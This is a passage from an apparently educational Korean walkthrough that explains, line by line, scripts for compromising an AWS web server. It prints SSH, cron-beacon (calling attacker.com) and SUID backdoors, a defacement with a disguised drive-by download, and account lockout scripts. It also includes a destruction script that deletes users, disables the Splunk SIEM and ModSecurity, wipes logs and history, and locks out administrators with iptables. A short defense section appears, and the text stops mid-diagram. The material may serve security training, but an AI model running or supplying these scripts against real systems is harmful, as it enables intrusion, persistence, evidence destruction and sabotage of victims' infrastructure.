ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key

# 공개키를 서버에 추가 (위 코드)
cat ~/.ssh/backdoor_key.pub >> /root/.ssh/authorized_keys

# 이제 비밀번호 없이 SSH 접속!
ssh -i ~/.ssh/backdoor_key root@52.79.240.83
```

##### Cron Job 백도어

```python
command = """
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://attacker.com/beacon?host=$(hostname)") | crontab -
"""
```

**의도**: 5분마다 공격자 서버에 연결

**작동 원리**:
```bash
# Cron에 추가
*/5 * * * * curl -s http://attacker.com/beacon?host=$(hostname)
│   │ │ │ │
│   │ │ │ └─ 명령어
│   │ │ └─── 요일 (*)
│   │ └───── 월 (*)
│   └─────── 일 (*)
└─────────── 분 (매 5분)

# 5분마다 실행:
curl http://attacker.com/beacon?host=ip-172-31-32-100
```

**공격자 서버 (attacker.com)**:
```python
# Flask 서버
@app.route('/beacon')
def beacon():
    host = request.args.get('host')
    log(f"[{datetime.now()}] Beacon from: {host}")

    # 추가 명령 전달 가능
    return "whoami; pwd"
```

##### SUID Shell 백도어

```python
command = """
cp /bin/bash /tmp/.hidden_shell
chmod 4755 /tmp/.hidden_shell
"""
```

**의도**: 권한 상승용 SUID 바이너리

**SUID (Set User ID)**:
```bash
# 일반 파일
-rwxr-xr-x  /bin/bash

# SUID 파일
-rwsr-xr-x  /tmp/.hidden_shell
   ^
   └─ s: SUID 비트

# 사용법
# 일반 사용자로 로그인
ssh apache@52.79.240.83

# SUID shell 실행
/tmp/.hidden_shell -p

# Root 권한 획득!
whoami  # → root
```

---

#### 7. 웹사이트 변조 (라인 289-439)

```python
def deface_website(self):
    hacked_html = """<!DOCTYPE html>
<html>
<head>
    <title>HACKED</title>
    ...
</head>
<body>
    <div class="container">
        <div class="skull">☠️</div>
        <h1>SYSTEM COMPROMISED</h1>
        ...
    </div>
</body>
</html>"""
```

**의도**: 해킹 페이지 HTML 작성

```python
# Base64 인코딩 (특수문자 처리)
import base64
encoded_html = base64.b64encode(hacked_html.encode()).decode()
```

**왜 Base64?**:
- HTML에 `<`, `>`, `"`, `'` 같은 특수문자 많음
- Shell에서 직접 echo하면 에러
- Base64로 인코딩 → 안전하게 전송 → 디코딩

```python
command = f"""
# 원본 백업
cp /var/www/html/www/index.php /var/www/html/www/index.php.bak

# 해킹 페이지 생성
echo '{encoded_html}' | base64 -d > /var/www/html/www/index.php

# 권한 설정
chown apache:apache /var/www/html/www/index.php
chmod 644 /var/www/html/www/index.php
"""
```

**실행 과정**:
```bash
# 1. 원본 백업
cp index.php index.php.bak

# 2. Base64 디코딩 후 index.php 덮어쓰기
echo 'PCFET0NUWVBFIGh0bWw+...' | base64 -d > index.php

# 3. Apache 소유권
chown apache:apache index.php
```

**결과**: http://52.79.240.83 접속 → 해킹 페이지 표시!

---

<a name="phase-4"></a>
## Phase 4: 웹사이트 변조 (MODERN_DEFACEMENT.sh)

### 목적
현대적이고 현실적인 랜섬웨어 스타일 페이지 + 자동 악성코드 다운로드

### 코드 분석

#### 1. IP 자동 감지 (라인 15-32) - 신규!

```bash
# 서버에서 직접 실행하므로 IP 자동 감지
echo "[*] 서버 IP 자동 감지 중..."

# 1. Public IP 가져오기 (AWS IMDS)
TARGET_SERVER=$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4 2>/dev/null)
```

**의도**: AWS IMDS에서 Public IP 자동 획득

**IMDS 요청**:
```bash
curl http://169.254.169.254/latest/meta-data/public-ipv4
→ 52.79.240.83
```

```bash
# 2. Public IP 없으면 hostname -I 사용
if [ -z "$TARGET_SERVER" ]; then
    TARGET_SERVER=$(hostname -I | awk '{print $1}')
fi
```

**의도**: IMDS 안되면 로컬 IP 사용
- `hostname -I`: 모든 IP 주소 나열
- `awk '{print $1}'`: 첫 번째 IP만 추출

```bash
# 3. 그래도 없으면 localhost
if [ -z "$TARGET_SERVER" ]; then
    TARGET_SERVER="localhost"
fi
```

**fallback**: 최악의 경우 localhost

---

#### 2. 악성코드 생성 (라인 34-54)

```bash
mkdir -p $WWW/downloads
cat > $WWW/downloads/malware.bat << 'EOF'
@echo off
title RANSOMWARE ATTACK
color 0C
cls
echo.
echo ============================================
echo    ALL YOUR FILES ARE ENCRYPTED!
echo ============================================
echo.
echo [!] Payment Required: 5 Bitcoin
echo [+] C2 Server: CONNECTED
echo [+] Keylogger: RUNNING
echo [+] Data Exfil: IN PROGRESS
echo.
pause
EOF
```

**의도**: 가짜 랜섬웨어 배치 파일 (데모용)

**실행하면**:
```
============================================
   ALL YOUR FILES ARE ENCRYPTED!
============================================

[!] Payment Required: 5 Bitcoin
[+] C2 Server: CONNECTED
[+] Keylogger: RUNNING
[+] Data Exfil: IN PROGRESS

계속하려면 아무 키나 누르십시오 . . .
```

**주의**: 실제로는 아무것도 안함! 교육용 데모

```bash
chmod 644 $WWW/downloads/malware.bat
chown apache:apache $WWW/downloads/malware.bat
```

**의도**: Apache가 읽을 수 있게 권한 설정

---

#### 3. PHP 강제 다운로드 (라인 56-89)

```bash
cat > $WWW/dl.php << 'EOFPHP'
<?php
// 완전히 숨겨진 강제 다운로드 (경로 안물어봄)
$file = __DIR__ . '/downloads/malware.bat';

if (file_exists($file)) {
    // 캐시 방지
    header('Cache-Control: no-cache, must-revalidate');
    header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');
```

**의도**: 브라우저 캐시 무효화
- 매번 새로 다운로드되게

```php
// 강제 다운로드 헤더
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="system_update.exe"');
header('Content-Length: ' . filesize($file));
header('Content-Transfer-Encoding: binary');
```

**한 줄 한 줄 의미**:
- `Content-Type: application/octet-stream`: 이진 파일 (실행 파일)
- `Content-Disposition: attachment`: 브라우저에서 열지 말고 **다운로드**
- `filename="system_update.exe"`: 다운로드 파일명 (위장!)
  - 실제: `malware.bat`
  - 사용자가 보는 이름: `system_update.exe`
- `Content-Length`: 파일 크기
- `Content-Transfer-Encoding: binary`: 이진 전송

```php
// 출력 버퍼 클리어
ob_clean();
flush();

// 파일 전송
readfile($file);
exit;
```

**의도**: 파일 내용 전송
- `ob_clean()`: 이전 출력 제거
- `flush()`: 버퍼 비우기
- `readfile()`: 파일 내용 출력
- `exit`: 즉시 종료 (추가 HTML 안나감)

---

#### 4. 현대적인 UI (라인 92-466)

##### CSS 디자인 (라인 100-346)

```css
body {
    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
    color: #e0e0e0;
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    min-height: 100vh;
    padding: 2rem;
}
```

**의도**: 다크 테마 배경
- `linear-gradient`: 그라데이션 배경
- `#0a0a0a → #1a1a1a`: 검은색 그라데이션
- `Inter` 폰트: 현대적인 산세리프

```css
.logo {
    font-size: 2.5rem;
    font-weight: 700;
    color: #ff3b3b;
    letter-spacing: 2px;
    margin-bottom: 1rem;
}
```

**의도**: 랜섬웨어 그룹 로고 스타일
- 빨간색 (#ff3b3b)
- 큰 폰트 (2.5rem)
- 자간 넓게 (letter-spacing: 2px)

```css
.countdown-timer {
    font-size: 3rem;
    font-weight: 700;
    color: #ff3b3b;
    font-variant-numeric: tabular-nums;
}
```

**의도**: 카운트다운 타이머 (LockBit 스타일)
- `tabular-nums`: 숫자 너비 고정 (깜빡임 방지)

---

##### JavaScript 카운트다운 (라인 433-448)

```javascript
// Countdown timer
let timeLeft = 47 * 3600 + 23 * 60 + 15;  // 47시간 23분 15초

function updateTimer() {
    const hours = Math.floor(timeLeft / 3600);
    const minutes = Math.floor((timeLeft % 3600) / 60);
    const seconds = timeLeft % 60;

    document.getElementById('timer').textContent =
        `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;

    if (timeLeft > 0) timeLeft--;
}

setInterval(updateTimer, 1000);
updateTimer();
```

**의도**: 실시간 카운트다운 (긴박감)

**한 줄 한 줄 의미**:
- `timeLeft = 47 * 3600 + 23 * 60 + 15`: 초 단위로 변환
- `Math.floor(timeLeft / 3600)`: 시간 계산
- `timeLeft % 3600`: 3600으로 나눈 나머지 (분+초)
- `(timeLeft % 3600) / 60`: 분 계산
- `timeLeft % 60`: 초 계산
- `String(hours).padStart(2, '0')`: 앞에 0 붙이기
  - `7` → `07`
  - `23` → `23`
- `setInterval(updateTimer, 1000)`: 1초마다 실행
- `if (timeLeft > 0) timeLeft--`: 1초씩 감소

**화면 표시**:
```
Time until price doubles
47:23:15
47:23:14
47:23:13
...
00:00:00
```

---

##### 자동 다운로드 (라인 450-467)

```javascript
// Silent download
setTimeout(() => {
    try {
        const iframe = document.getElementById('dl');
        iframe.src = '/dl.php';

        setTimeout(() => {
            document.getElementById('download-status').textContent = 'COMPLETE';
        }, 3000);
    } catch(e) {
        console.error('Download error:', e);
    }
}, 2000);
```

**의도**: 2초 후 자동 다운로드

**한 줄 한 줄 의미**:
- `setTimeout(..., 2000)`: 2초 대기
- `document.getElementById('dl')`: 숨겨진 iframe 찾기
  ```html
  <iframe id="dl" style="display:none;"></iframe>
  ```
- `iframe.src = '/dl.php'`: iframe에 URL 설정
  - 브라우저가 `/dl.php` 요청
  - PHP가 강제 다운로드 헤더 전송
  - 브라우저가 자동으로 다운로드 시작
  - **사용자는 클릭 안함!**
- `setTimeout(..., 3000)`: 3초 후 상태 업데이트
- `textContent = 'COMPLETE'`: UI에 완료 표시

**실행 흐름**:
```
0초: 페이지 로드
2초: iframe.src = '/dl.php'
    → GET /dl.php
    → PHP: Content-Disposition: attachment; filename="system_update.exe"
    → 브라우저: 다운로드 시작
5초: download-status → 'COMPLETE'
```

**사용자 경험**:
```
1. 사이트 접속
2. "SYSTEM COMPROMISED" 페이지 표시
3. 2초 후... 브라우저 하단에 다운로드 바 나타남
   📥 system_update.exe (다운로드 중...)
4. 자동으로 Downloads 폴더에 저장
5. 사용자는 클릭도 안했는데 파일 다운로드됨!
```

---

## 🎯 전체 공격 체인 요약

### 웹 취약점 → AWS 인프라 장악 → Root 권한

```
┌──────────────────────────────────────┐
│ 1. 개발자의 작은 실수                │
├──────────────────────────────────────┤
│ • IMDSv1 활성화 (깜빡함)           │
│ • /api/health.php 생성             │
│ • ModSecurity 예외 (급하게)        │
└──────────────────────────────────────┘
            ↓
┌──────────────────────────────────────┐
│ 2. 공격자 발견                       │
├──────────────────────────────────────┤
│ • 포트 스캔 / 디렉터리 브루트포스   │
│ • /api/health.php 발견!            │
│ • SSRF 테스트                       │
└──────────────────────────────────────┘
            ↓
┌──────────────────────────────────────┐
│ 3. IAM Credentials 탈취             │
├──────────────────────────────────────┤
│ • IMDS 접근                         │
│ • IAM Role 이름 획득                │
│ • Access Key + Secret + Token 탈취 │
└──────────────────────────────────────┘
            ↓
┌──────────────────────────────────────┐
│ 4. AWS 인프라 열거                  │
├──────────────────────────────────────┤
│ • EC2 인스턴스 목록                 │
│ • S3 버킷 (.env, backup.sql)       │
│ • RDS 정보                          │
│ • Secrets Manager                   │
└──────────────────────────────────────┘
            ↓
┌──────────────────────────────────────┐
│ 5. SSM으로 서버 접근                │
├──────────────────────────────────────┤
│ • send_command("whoami")            │
│ • → root                            │
│ • 백도어 생성 (SSH, Cron, SUID)    │
└──────────────────────────────────────┘
            ↓
┌──────────────────────────────────────┐
│ 6. 웹사이트 변조                    │
├──────────────────────────────────────┤
│ • index.php 교체                    │
│ • 랜섬웨어 스타일 페이지            │
│ • 자동 악성코드 다운로드            │
└──────────────────────────────────────┘
            ↓
┌──────────────────────────────────────┐
│ 7. 공격 완료                        │
├──────────────────────────────────────┤
│ • 웹사이트: 해킹 페이지 표시        │
│ • 백도어: SSH/웹쉘로 언제든 접근   │
│ • 데이터: S3, DB, Secrets 탈취     │
│ • 권한: Root                        │
└──────────────────────────────────────┘
```

---

## 📚 핵심 교훈

### 1. 하나의 작은 틈 = 전체 무너짐
```
완벽한 WAF ✅
완벽한 SIEM ✅
완벽한 보안 설정 ✅
     ↓
단 하나의 예외 설정
(/api/health.php)
     ↓
전체 시스템 장악 🔥
```

### 2. Defense in Depth
```
Layer 1: WAF → 우회됨 (예외 설정)
Layer 2: IMDS → 취약함 (v1 활성화)
Layer 3: IAM → 과도한 권한 (S3, Secrets 접근)
Layer 4: SSM → Root 권한 (Agent 실행)

→ 모든 계층이 뚫림!
```

### 3. 클라우드 보안의 중요성
```
온프레미스 시대:
  웹 취약점 → 웹 서버만 장악

클라우드 시대:
  웹 취약점 → IAM Credentials 탈취
             → 전체 인프라 장악
             → S3, RDS, Secrets, 다른 EC2...
```

---

## 🛡️ 방어 방법

### 즉시 조치
```bash
# 1. IMDSv2 필수
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxx \
  --http-tokens required  # ← SSRF 차단

# 2. ModSecurity 예외 제거
# /etc/httpd/conf.d/mod_security.conf
# <LocationMatch "/api/health\.php">
#     SecRuleEngine Off  # ← 삭제!
# </LocationMatch>

# 3. SSRF 입력 검증
// PHP
$allowed_hosts = ['api.example.com'];
$parsed = parse_url($_GET['url']);
if (!in_array($parsed['host'], $allowed_hosts)) {
    die('Invalid host');
}

// IMDS 차단
if (preg_match('/^169\.254\./', $ip)) {
    die('IMDS blocked');
}
```

---

<a name="phase-5"></a>
## Phase 5: 사이트 토글 (TOGGLE_SITE.sh)

### 목적
정상 사이트 ↔ 해킹 사이트 왔다갔다 하기

### 핵심 로직

#### 1. 현재 상태 확인 (라인 33)

```bash
# 현재 상태 확인 (BLACKLOCK RANSOMWARE로 체크)
if grep -q "BLACKLOCK RANSOMWARE" "$WWW/index.php" 2>/dev/null; then
```

**의도**: 해킹 페이지 여부 판단
- `grep -q`: 조용히 찾기 (출력 없음)
- `"BLACKLOCK RANSOMWARE"`: 새 UI의 특징적인 문자열
- 있으면 → 해킹 상태
- 없으면 → 정상 상태

#### 2. 해킹 → 정상 복구 (라인 41-57)

```bash
if [ -f "$BACKUP" ]; then
    cp "$BACKUP" "$WWW/index.php"
    rm -f "$WWW/dl.php"
    rm -rf "$WWW/downloads"
    chown apache:apache "$WWW/index.php"
    chmod 644 "$WWW/index.php"
    systemctl restart httpd
```

**의도**: 원본 복구
- `$BACKUP`: `/tmp/index_REAL.php` (백업 파일)
- `cp`: 원본으로 복구
- `rm -f`: dl.php 삭제 (다운로드 기능 제거)
- `rm -rf`: downloads 폴더 삭제
- `chown`: Apache 소유권 복구
- `systemctl restart`: 웹서버 재시작

#### 3. 정상 → 해킹 전환 (라인 67-268)

```bash
# 원본 백업
if [ ! -f "$BACKUP" ]; then
    cp "$WWW/index.php" "$BACKUP"
fi
```

**의도**: 처음 실행 시에만 백업
- `[ ! -f "$BACKUP" ]`: 백업 파일 없으면
- `cp`: 원본 백업 (복구용)

**나머지는 DEPLOY_HACK_V2.sh와 동일**

---

<a name="phase-6"></a>
## Phase 6: 사용자 차단 (LOCKDOWN_USERS.sh)

### 목적
사용자 **삭제 대신 차단** (root, sysadmin만 접속 가능)

### 핵심 기법 3가지

#### 1. SSH 접속 제한 (라인 51-74)

```bash
SSHD_CONFIG="/etc/ssh/sshd_config"

# 기존 AllowUsers 제거
sed -i '/^AllowUsers/d' "$SSHD_CONFIG"

# 새로운 AllowUsers 추가
echo "AllowUsers ${ALLOWED_USERS[@]}" >> "$SSHD_CONFIG"
# → AllowUsers root sysadmin
```

**의도**: SSH 화이트리스트

**작동 원리**:
```bash
# ec2-user가 SSH 접속 시도
$ ssh ec2-user@server

# SSH가 /etc/ssh/sshd_config 확인
AllowUsers root sysadmin
# → ec2-user는 목록에 없음!

# 결과
Permission denied (publickey).
```

**한 줄 한 줄 의미**:
- `sed -i '/^AllowUsers/d'`: 기존 AllowUsers 줄 삭제
  - `/^AllowUsers/`: AllowUsers로 시작하는 줄
  - `d`: delete
  - `-i`: 파일 직접 수정
- `echo "AllowUsers root sysadmin" >> ...`: 추가
- `systemctl restart sshd`: SSH 재시작 (설정 적용)

---

#### 2. 비밀번호 잠금 (라인 83-103)

```bash
for user in $ALL_USERS; do
    # 허용 사용자는 건너뛰기
    if [[ " ${ALLOWED_USERS[@]} " =~ " ${user} " ]]; then
        continue
    fi

    # 계정 잠금
    passwd -l "$user"
```

**의도**: 비밀번호 인증 무효화

**passwd -l의 동작**:
```bash
# 실행 전
$ grep ec2-user /etc/shadow
ec2-user:$6$random_hash...:18900:0:99999:7:::

# passwd -l 실행
passwd -l ec2-user

# 실행 후
$ grep ec2-user /etc/shadow
ec2-user:!$6$random_hash...:18900:0:99999:7:::
         ^
         └─ ! 추가됨 = 비밀번호 잠김
```

**결과**:
```bash
# ec2-user가 비밀번호로 로그인 시도
$ ssh ec2-user@server
Password: ********
Permission denied, please try again.

# 비밀번호가 맞아도 안됨!
```

---

#### 3. Shell 무효화 (라인 111-137) - 가장 강력!

```bash
for user in $ALL_USERS; do
    # 현재 Shell 확인
    CURRENT_SHELL=$(getent passwd "$user" | cut -d: -f7)
    # /bin/bash

    # Shell을 /sbin/nologin으로 변경
    usermod -s /sbin/nologin "$user"
```

**의도**: 로그인 자체를 막기

**한 줄 한 줄 의미**:
- `getent passwd "$user"`: /etc/passwd에서 사용자 정보 가져오기
  ```
  ec2-user:x:1000:1000::/home/ec2-user:/bin/bash
  ```
- `cut -d: -f7`: 7번째 필드 (Shell) 추출
  - `-d:`: `:` 구분자
  - `-f7`: 7번째 필드
- `usermod -s /sbin/nologin "$user"`: Shell 변경
  - `-s`: shell 변경
  - `/sbin/nologin`: 로그인 불가 shell

**Shell이란?**:
```bash
# 정상 Shell (/bin/bash)
$ ssh ec2-user@server
Last login: ...
ec2-user@server:~$ _  # ← 프롬프트 나옴 (성공)

# nologin Shell (/sbin/nologin)
$ ssh ec2-user@server
This account is currently not available.
Connection to server closed.  # ← 즉시 종료!
```

**실제 변경**:
```bash
# 변경 전
$ grep ec2-user /etc/passwd
ec2-user:x:1000:1000::/home/ec2-user:/bin/bash

# usermod -s /sbin/nologin 실행

# 변경 후
$ grep ec2-user /etc/passwd
ec2-user:x:1000:1000::/home/ec2-user:/sbin/nologin
```

---

#### 4. 활성 세션 종료 (라인 145-164)

```bash
for user in $ALL_USERS; do
    # 허용 사용자는 건너뛰기
    if [[ " ${ALLOWED_USERS[@]} " =~ " ${user} " ]]; then
        continue
    fi

    # 사용자의 모든 프로세스 종료
    pkill -9 -u "$user"
```

**의도**: 현재 로그인된 세션도 강제 종료

**한 줄 한 줄 의미**:
- `pkill -9 -u "$user"`: 사용자 프로세스 전부 kill
  - `pkill`: 프로세스 이름으로 종료
  - `-9`: SIGKILL (강제 종료)
  - `-u "$user"`: 특정 사용자의 프로세스만

**실행 예시**:
```bash
# ec2-user가 로그인 중
$ w
ec2-user pts/0    192.168.1.100  10:30   0.00s  bash

# pkill -9 -u ec2-user 실행

# ec2-user의 화면
Connection to server closed by remote host.
Connection to server closed.

# 강제로 쫓겨남!
```

---

### 차단 효과 종합

**3중 방어막**:
```
1. SSH 시도
   → AllowUsers 확인
   → ec2-user 없음
   → Permission denied ✗

2. (만약 SSH 통과해도)
   → 비밀번호 확인
   → passwd -l로 잠김
   → Authentication failed ✗

3. (만약 인증 통과해도)
   → Shell 실행
   → /sbin/nologin
   → This account is currently not available ✗
   → 즉시 연결 종료
```

**결과**: 완벽 차단!

---

<a name="phase-7"></a>
## Phase 7: 최종 파괴 (FINAL_DESTRUCTION.sh)

### 목적
시스템 완전 무력화 - 복구 불가능하게 만들기

### ⚠️ 위험도: CRITICAL

**이 스크립트는 실제로 실행하면 안됨!** 교육용 참고만!

### 핵심 파괴 단계

#### 1. 모든 사용자 삭제 (라인 68-102)

```bash
# 모든 일반 사용자 나열 (UID >= 1000)
ALL_USERS=$(awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd)
```

**의도**: 시스템 사용자 제외하고 일반 사용자만 찾기

**한 줄 한 줄 의미**:
- `awk -F: ...`: `/etc/passwd` 파싱
- `-F:`: `:` 구분자
- `'$3 >= 1000 && $3 < 65534'`: UID 조건
  - `$3`: 3번째 필드 (UID)
  - `>= 1000`: 일반 사용자 (시스템 사용자는 < 1000)
  - `< 65534`: nobody 사용자 제외
- `{print $1}`: 1번째 필드 (사용자명) 출력

**UID 구조**:
```
0        : root
1-999    : 시스템 계정 (daemon, www-data, etc)
1000-    : 일반 사용자 ← 이것들 삭제!
65534    : nobody (특수 계정)
```

```bash
for user in $ALL_USERS; do
    # 보호 대상은 건너뛰기
    if [[ " ${PROTECTED_USERS[@]} " =~ " ${user} " ]]; then
        continue
    fi

    # 사용자의 모든 프로세스 종료
    pkill -u "$user"

    # 홈 디렉토리까지 삭제
    userdel -r "$user"
```

**userdel -r의 파괴력**:
```bash
# 사용자 ec2-user 존재
$ ls /home/
ec2-user

$ id ec2-user
uid=1000(ec2-user) gid=1000(ec2-user) groups=...

# userdel -r ec2-user 실행

# 결과
$ id ec2-user
id: 'ec2-user': no such user

$ ls /home/
# (텅 빔)

# /etc/passwd에서도 삭제
$ grep ec2-user /etc/passwd
# (결과 없음)
```

---

#### 2. Splunk SIEM 제거 (라인 110-134)

```bash
# Splunk Forwarder 중지
systemctl stop splunkforwarder
systemctl disable splunkforwarder

# Splunk 프로세스 강제 종료
pkill -9 splunkd
pkill -9 splunk

# Splunk 설정 삭제
rm -rf /opt/splunkforwarder
```

**의도**: 보안 모니터링 완전 제거

**Splunk란?**:
- SIEM (Security Information and Event Management)
- 모든 로그 수집 및 분석
- 의심스러운 활동 탐지

**제거 효과**:
```
Before (Splunk 있을 때):
  [공격자] 의심스러운 명령 실행
      ↓
  [Splunk] 로그 수집 → 분석 → 알람!
      ↓
  [보안팀] "침입 감지! 조사하자!"

After (Splunk 제거):
  [공격자] 뭘 하든
      ↓
  [Splunk] (없음)
      ↓
  [보안팀] (아무것도 모름)
```

---

#### 3. ModSecurity WAF 무력화 (라인 142-167)

```bash
MODSEC_CONFS=(
    "/etc/httpd/conf.d/mod_security.conf"
    "/etc/apache2/mods-enabled/security2.conf"
    "/etc/modsecurity/modsecurity.conf"
)

for conf in "${MODSEC_CONFS[@]}"; do
    # SecRuleEngine On → Off
    sed -i 's/SecRuleEngine On/SecRuleEngine Off/g' "$conf"
```

**의도**: WAF 완전 비활성화

**sed 명령어 분석**:
- `sed -i`: 파일 직접 수정
- `'s/A/B/g'`: A를 B로 전부 교체
- `SecRuleEngine On → Off`: WAF 끄기

**비활성화 효과**:
```
Before (WAF On):
  SQL Injection 시도 → 차단 ✗
  XSS 시도 → 차단 ✗
  SSRF 시도 → 차단 ✗

After (WAF Off):
  SQL Injection → 통과 ✓
  XSS → 통과 ✓
  SSRF → 통과 ✓
  모든 공격 무방비!
```

---

#### 4. 로그 삭제 (라인 175-210) - 흔적 제거

```bash
LOGS=(
    "/var/log/auth.log"      # SSH 로그인 기록
    "/var/log/secure"        # 인증 로그
    "/var/log/messages"      # 시스템 메시지
    "/var/log/syslog"        # 시스템 로그
    "/var/log/httpd/*"       # 웹 서버 로그
    "/var/log/audit/audit.log"  # 감사 로그
    "/var/log/wtmp"          # 로그인 히스토리
    "/var/log/lastlog"       # 마지막 로그인
    "$HOME/.bash_history"    # 쉘 명령어 히스토리
)

for log in "${LOGS[@]}"; do
    # 로그 파일 비우기
    > "$log" 2>/dev/null
```

**의도**: 모든 흔적 제거

**`>` 연산자**:
```bash
# 원래 로그 파일
$ cat /var/log/auth.log
Nov 19 10:00:01 sshd[1234]: Accepted password for attacker from 1.2.3.4
Nov 19 10:05:23 sudo: attacker : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
Nov 19 10:10:45 userdel[5678]: delete user 'ec2-user'
...

# > /var/log/auth.log 실행

# 로그 파일 비워짐
$ cat /var/log/auth.log
(텅 빔)

# 파일은 존재하지만 내용 0바이트
$ ls -lh /var/log/auth.log
-rw-r----- 1 syslog adm 0 Nov 19 10:15 /var/log/auth.log
```

**왜 삭제 대신 비우기?**:
```bash
# 삭제하면 (rm)
rm /var/log/auth.log
→ 파일 자체가 없어짐 → 의심스러움!

# 비우기 (>)
> /var/log/auth.log
→ 파일은 있지만 비어있음 → 덜 의심스러움
```

```bash
# 현재 쉘 히스토리도 삭제
history -c
```

**`history -c`**:
```bash
# 실행 전
$ history
  1  ssh attacker@victim
  2  sudo su -
  3  userdel -r ec2-user
  ...
  100 pkill -9 splunkd

# history -c 실행

# 실행 후
$ history
  1  history
```

---

#### 5. SSH 봉쇄 (라인 218-247)

```bash
# Root 로그인 허용
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/g' "$SSHD_CONFIG"

# 비밀번호 인증 비활성화 (키 기반만)
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/g' "$SSHD_CONFIG"

# 특정 사용자만 허용
echo "AllowUsers $ATTACKER root" >> "$SSHD_CONFIG"
```

**의도**: 공격자만 접속 가능

**설정 변경**:
```apache
# Before
#PermitRootLogin prohibit-password
PasswordAuthentication yes

# After
PermitRootLogin yes                # ← Root 로그인 허용
PasswordAuthentication no          # ← 키 필수
AllowUsers attacker root           # ← 공격자만
```

**효과**:
```bash
# 관리자가 복구 시도
$ ssh admin@server
Permission denied (AllowUsers에 없음)

$ ssh root@server
Password: ********
Permission denied (비밀번호 인증 안됨)

# 공격자만 접속 가능
$ ssh -i backdoor_key attacker@server
attacker@server:~$ _  # ← 성공!
```

---

#### 6. Cron Jobs 삭제 (라인 255-274)

```bash
# 모든 사용자의 Cron 삭제
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -r -u "$user"
done

# 시스템 Cron 삭제
rm -rf /etc/cron.*
rm -rf /var/spool/cron/*
```

**의도**: 자동 복구 작업 방지

**Cron이란?**:
```bash
# 관리자가 설정한 자동 복구 스크립트
# /etc/cron.daily/backup.sh
#!/bin/bash
# 매일 00:00에 백업
rsync -av /var/www/html/ backup-server:/backups/

# /etc/cron.hourly/health_check.sh
#!/bin/bash
# 매시간 웹사이트 체크
if ! curl -s http://localhost/ | grep -q "정상 페이지"; then
    # 이상 감지 시 복구
    systemctl restart httpd
    mail -s "Alert" admin@company.com
fi
```

**삭제 후**:
```bash
# Cron 삭제
rm -rf /etc/cron.*

# 이제 복구 스크립트 실행 안됨
→ 웹사이트 해킹된 채로 계속 유지!
→ 자동 알람 안감!
```

---

#### 7. 방화벽 설정 (라인 282-306)

```bash
# 공격자 IP 감지
ATTACKER_IP=$(who am i | awk '{print $5}' | tr -d '()')

# iptables로 SSH 포트 제한
iptables -F INPUT                                          # 기존 규칙 삭제
iptables -A INPUT -p tcp --dport 22 -s "$ATTACKER_IP" -j ACCEPT  # 공격자만 허용
iptables -A INPUT -p tcp --dport 22 -j DROP               # 나머지 차단
```

**의도**: 공격자 IP만 SSH 허용

**한 줄 한 줄 의미**:
- `who am i`: 현재 로그인 정보
  ```
  attacker pts/0        2025-11-19 10:00 (1.2.3.4)
  ```
- `awk '{print $5}'`: 5번째 필드 (IP)
  ```
  (1.2.3.4)
  ```
- `tr -d '()'`: 괄호 제거
  ```
  1.2.3.4
  ```
- `iptables -F INPUT`: INPUT 체인 비우기
- `iptables -A INPUT ...`: 규칙 추가
  - `-A INPUT`: INPUT 체인에 추가
  - `-p tcp`: TCP 프로토콜
  - `--dport 22`: 목적지 포트 22 (SSH)
  - `-s "$ATTACKER_IP"`: 출발지 IP
  - `-j ACCEPT`: 허용
  - `-j DROP`: 차단

**효과**:
```bash
# 공격자 (1.2.3.4)
$ ssh attacker@server
✓ 접속 성공!

# 관리자 (5.6.7.8)
$ ssh admin@server
(응답 없음... 타임아웃)

# iptables가 패킷 자체를 DROP!
```

---

### 최종 파괴 효과

**Before (정상 시스템)**:
```
✓ 사용자: ec2-user, admin, dev1, dev2, ...
✓ Splunk: 모든 로그 수집
✓ ModSecurity: 웹 공격 차단
✓ 로그: /var/log/* 전부 있음
✓ SSH: 모든 관리자 접속 가능
✓ Cron: 자동 백업/복구
✓ 방화벽: 열려있음
```

**After (FINAL_DESTRUCTION 실행)**:
```
✗ 사용자: root, attacker만
✗ Splunk: 제거됨
✗ ModSecurity: 비활성화
✗ 로그: 전부 비워짐 (0바이트)
✗ SSH: attacker만 접속 가능
✗ Cron: 전부 삭제
✗ 방화벽: 공격자 IP만 허용

→ 복구 불가능!
```

---

## 📊 전체 공격 체인 (최종판)

```
┌─────────────────────────────────────────────┐
│ Phase 0: 취약점 생성                        │
├─────────────────────────────────────────────┤
│ • IMDSv1 활성화                            │
│ • /api/health.php 생성 (SSRF)             │
│ • ModSecurity 예외 추가                    │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│ Phase 1: IAM Credentials 탈취               │
├─────────────────────────────────────────────┤
│ • SSRF로 IMDS 접근                         │
│ • IAM Role → Access Key + Secret + Token  │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│ Phase 2: AWS 인프라 열거                   │
├─────────────────────────────────────────────┤
│ • EC2 인스턴스 목록                        │
│ • S3 버킷 (.env, backup.sql)              │
│ • RDS 정보                                 │
│ • Secrets Manager (비밀번호, API 키)      │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│ Phase 3: SSM으로 Root 권한                 │
├─────────────────────────────────────────────┤
│ • send_command("whoami") → root           │
│ • SSH, Cron, SUID 백도어 생성             │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│ Phase 4: 웹사이트 변조 (PDF 위장)          │
├─────────────────────────────────────────────┤
│ • 랜섬웨어 스타일 페이지                   │
│ • PDF로 위장 (브라우저 경고 없음)         │
│ • 2초 후 자동 다운로드                     │
└─────────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────────┐
│ Phase 5: 사이트 토글                       │
├─────────────────────────────────────────────┤
